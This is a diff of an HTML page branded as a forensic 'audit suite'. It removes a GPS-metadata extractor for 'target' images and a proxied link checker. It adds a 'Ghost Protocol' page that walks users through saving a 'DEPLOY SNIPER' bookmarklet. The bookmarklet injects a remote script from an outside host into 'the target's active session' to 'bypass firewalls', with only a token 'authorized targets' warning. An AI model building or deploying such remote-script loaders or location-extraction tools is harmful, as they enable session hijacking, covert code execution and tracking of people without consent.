@@ -3,177 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SOVEREIGN | Digital Audit Suite</title>
+    <title>SOVEREIGN v5.0 | Session Audit Suite</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.js"></script>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; }
-        .tool-card { border: 1px solid #111; transition: 0.3s; background: #0a0a0a; }
-        .tool-card:hover { border-color: #00ff41; box-shadow: 0 0 15px rgba(0,255,65,0.1); }
-        .active-tab { background: #00ff41 !important; color: #000 !important; border-color: #00ff41; }
-        .hidden { display: none; }
-        .scan-line { height: 2px; background: #00ff41; position: absolute; width: 100%; top: 0; animation: scan 3s infinite linear; opacity: 0.1; pointer-events: none; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        body { background: #020202; color: #00ff41; font-family: 'Courier New', monospace; }
+        .terminal-card { border: 1px solid #1a1a1a; background: rgba(5, 5, 5, 0.9); transition: 0.3s; }
+        .terminal-card:hover { border-color: #00ff41; box-shadow: 0 0 20px rgba(0,255,65,0.1); }
+        .glow-text { text-shadow: 0 0 10px rgba(0,255,65,0.5); }
     </style>
 </head>
-<body class="p-4 md:p-10 relative">
-    <div class="scan-line"></div>
-
-    <div class="max-w-4xl mx-auto relative z-10">
-        <header class="mb-10 border-b border-zinc-800 pb-6">
-            <h1 class="text-xs tracking-[0.5em] text-zinc-500 uppercase">Forensic Intelligence Platform</h1>
-            <h2 class="text-3xl font-black italic text-white uppercase">Sovereign <span class="text-green-500">Audit Suite</span></h2>
+<body class="p-6 md:p-12 min-h-screen">
+    <div class="max-w-3xl mx-auto">
+        <header class="mb-12 border-b border-zinc-800 pb-8 text-center">
+            <h1 class="text-[10px] tracking-[0.8em] text-zinc-500 uppercase mb-2">Forensic Intelligence Node</h1>
+            <h2 class="text-4xl font-black text-white italic glow-text italic uppercase">Sovereign <span class="text-green-500">Suite</span></h2>
         </header>
 
-        <!-- TOOL NAV -->
-        <div class="grid grid-cols-2 gap-2 mb-8">
-            <button onclick="showTool('metadata')" id="btn-metadata" class="p-3 tool-card active-tab text-xs font-bold uppercase">1. Privacy Scan</button>
-            <button onclick="showTool('links')" id="btn-links" class="p-3 tool-card text-zinc-500 text-xs font-bold uppercase">2. Revenue Leaks</button>
-        </div>
-
-        <!-- TOOL 1: PRIVACY SCANNER -->
-        <div id="tool-metadata" class="tool-view p-6 tool-card rounded-lg">
-            <h3 class="text-white font-bold mb-2">GPS & METADATA EXTRACTOR</h3>
-            <p class="text-[10px] text-zinc-500 mb-6 uppercase">Extract hidden location data from raw target images.</p>
+        <section class="terminal-card p-8 rounded-lg mb-8">
+            <h3 class="text-white font-bold mb-4 uppercase tracking-widest">Ghost Protocol Deployment</h3>
+            <p class="text-sm text-zinc-400 mb-8 leading-relaxed">
+                To bypass firewalls, the audit must run within the target's active session. 
+                Follow these steps to arm your browser:
+            </p>
             
-            <label class="block border-2 border-dashed border-zinc-800 p-10 text-center cursor-pointer hover:bg-zinc-900 transition-all">
-                <span class="text-xs text-zinc-400">TAP TO UPLOAD TARGET FILE</span>
-                <input type="file" id="imageInput" class="hidden" accept="image/*" />
-            </label>
-
-            <div id="metaResults" class="mt-8 space-y-4 hidden">
-                <div class="p-4 bg-black border border-zinc-800">
-                    <p class="text-[10px] text-zinc-500 uppercase mb-2">Audit Results:</p>
-                    <div id="metaContent" class="text-sm"></div>
+            <div class="space-y-4 mb-10">
+                <div class="flex items-start gap-4">
+                    <span class="bg-zinc-800 text-white px-2 py-1 text-[10px] font-bold">01</span>
+                    <p class="text-xs text-zinc-300">Long-press the "DEPLOY SNIPER" button below.</p>
+                </div>
+                <div class="flex items-start gap-4">
+                    <span class="bg-zinc-800 text-white px-2 py-1 text-[10px] font-bold">02</span>
+                    <p class="text-xs text-zinc-300">Copy the link address (the JavaScript payload).</p>
+                </div>
+                <div class="flex items-start gap-4">
+                    <span class="bg-zinc-800 text-white px-2 py-1 text-[10px] font-bold">03</span>
+                    <p class="text-xs text-zinc-300">Create a bookmark in your browser and paste the link as the URL.</p>
                 </div>
             </div>
-        </div>
 
-        <!-- TOOL 2: LINK SCANNER -->
-        <div id="tool-links" class="tool-view hidden p-6 tool-card rounded-lg">
-            <h3 class="text-white font-bold mb-2">BROKEN LINK DETECTOR</h3>
-            <p class="text-[10px] text-zinc-500 mb-6 uppercase">Scan business sites for 404 errors (Revenue Leaks).</p>
-            
-            <div class="flex flex-col gap-4">
-                <input type="text" id="urlInput" placeholder="https://example-law-firm.com" 
-                       class="bg-black border border-zinc-800 p-3 w-full text-green-500 outline-none focus:border-green-500 text-sm" />
-                <button onclick="runLinkAudit()" id="auditBtn" class="bg-green-600 text-black p-3 font-bold uppercase text-xs hover:bg-green-400 transition-all">Start Web Audit</button>
+            <!-- THE MASTER PAYLOAD BUTTON -->
+            <div class="text-center">
+                <a href="javascript:(function(){const s=document.createElement('script');s.src='https://your-project-name.vercel.app/sniper.js?t='+Date.now();document.body.appendChild(s);})();" 
+                   class="inline-block bg-green-600 text-black px-12 py-4 font-black uppercase text-sm hover:bg-green-400 transition-all shadow-[0_0_30px_rgba(0,255,65,0.2)]">
+                   🚀 DEPLOY SNIPER
+                </a>
+                <p class="text-[9px] mt-4 text-zinc-600 italic uppercase">Warning: Execute only on authorized targets.</p>
             </div>
+        </section>
 
-            <div id="linkResults" class="mt-8 space-y-4 hidden">
-                <div class="p-4 bg-black border border-zinc-800">
-                    <p class="text-[10px] text-zinc-500 uppercase mb-2">Crawl Status:</p>
-                    <div id="linkContent" class="text-xs leading-relaxed"></div>
-                </div>
-            </div>
-        </div>
+        <footer class="text-center text-[10px] text-zinc-700 tracking-widest uppercase">
+            &copy; 2026 Sovereign Digital Security // Lagos Node
+        </footer>
     </div>
-
-    <script>
-        // UI Navigation
-        function showTool(name) {
-            document.querySelectorAll('.tool-view').forEach(v => v.classList.add('hidden'));
-            document.querySelectorAll('button').forEach(b => b.classList.remove('active-tab', 'text-white'));
-            document.getElementById('tool-' + name).classList.remove('hidden');
-            document.getElementById('btn-' + name).classList.add('active-tab', 'text-white');
-        }
-
-        // --- TOOL 1: METADATA LOGIC ---
-        document.getElementById('imageInput').onchange = function(e) {
-            const file = e.target.files[0];
-            if(!file) return;
-            const resDiv = document.getElementById('metaResults');
-            const content = document.getElementById('metaContent');
-            resDiv.classList.remove('hidden');
-            content.innerHTML = "ANALYZING HEADERS...";
-
-            const reader = new FileReader();
-            reader.onload = function() {
-                EXIF.getData(file, function() {
-                    const lat = EXIF.getTag(this, "GPSLatitude");
-                    const lon = EXIF.getTag(this, "GPSLongitude");
-                    const software = EXIF.getTag(this, "Software") || "Original/Unknown";
-                    
-                    if (lat && lon) {
-                        const dLat = lat[0] + lat[1]/60 + lat[2]/3600;
-                        const dLon = lon[0] + lon[1]/60 + lon[2]/3600;
-                        content.innerHTML = `
-                            <p class="text-red-500 font-bold">🚨 CRITICAL: GPS DATA LEAKED</p>
-                            <p class="text-white mt-2">Coords: ${dLat.toFixed(6)}, ${dLon.toFixed(6)}</p>
-                            <p class="text-zinc-500 text-[10px] mt-1">MAP: https://google.com/maps?q=${dLat},${dLon}</p>
-                            <p class="mt-4">Software Trail: <span class="text-white">${software}</span></p>
-                        `;
-                    } else {
-                        content.innerHTML = `
-                            <p class="text-green-500 font-bold">✅ STATUS: PROTECTED</p>
-                            <p class="text-zinc-400 mt-2">No GPS tags found. Metadata has likely been stripped.</p>
-                            <p class="mt-4 text-xs italic">Software Trail: ${software}</p>
-                        `;
-                    }
-                });
-            };
-            reader.readAsArrayBuffer(file);
-        };
-
-        // --- TOOL 2: LINK AUDITOR LOGIC ---
-        async function runLinkAudit() {
-            const target = document.getElementById('urlInput').value.trim();
-            const content = document.getElementById('linkContent');
-            const resDiv = document.getElementById('linkResults');
-            const btn = document.getElementById('auditBtn');
-
-            if (!target.startsWith('http')) {
-                alert('Please enter a full URL (https://...)');
-                return;
-            }
-
-            resDiv.classList.remove('hidden');
-            btn.disabled = true;
-            btn.innerHTML = "CRAWLING...";
-            content.innerHTML = `<p class="animate-pulse">Connecting to ${target} via Proxy...</p>`;
-
-            try {
-                // Using AllOrigins Proxy to bypass CORS
-                const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(target)}`;
-                const response = await fetch(proxyUrl);
-                const data = await response.json();
-                
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(data.contents, 'text/html');
-                const links = Array.from(doc.querySelectorAll('a'))
-                                   .map(a => a.href)
-                                   .filter(h => h.startsWith('http'))
-                                   .slice(0, 10); // Limit to 10 for speed
-
-                content.innerHTML = `<p class="text-white">Found ${links.length} primary links. Auditing for errors...</p><br>`;
-
-                let errors = 0;
-                for (const link of links) {
-                    content.innerHTML += `<p class="text-zinc-500 uppercase text-[9px]">Testing: ${link.substring(0, 40)}...</p>`;
-                    // Check if link is alive
-                    try {
-                        const check = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(link)}`);
-                        if (!check.ok) throw new Error();
-                        content.innerHTML += `<p class="text-green-500 mb-2"> [OK] 200 SUCCESS</p>`;
-                    } catch (e) {
-                        errors++;
-                        content.innerHTML += `<p class="text-red-500 mb-2 font-bold"> [FAIL] 404/TIMEOUT</p>`;
-                    }
-                }
-
-                if(errors > 0) {
-                    content.innerHTML += `<br><p class="text-red-500 font-bold uppercase">🚨 Audit Failed: ${errors} Revenue Leaks Detected.</p>`;
-                } else {
-                    content.innerHTML += `<br><p class="text-green-500 font-bold uppercase">✅ Audit Passed: All Sales Funnels Secure.</p>`;
-                }
-
-            } catch (err) {
-                content.innerHTML = `<p class="text-red-500">CRITICAL: Server blocked the crawl. This site has a firewall.</p>`;
-            } finally {
-                btn.disabled = false;
-                btn.innerHTML = "START WEB AUDIT";
-            }
-        }
-    </script>
 </body>
 </html>
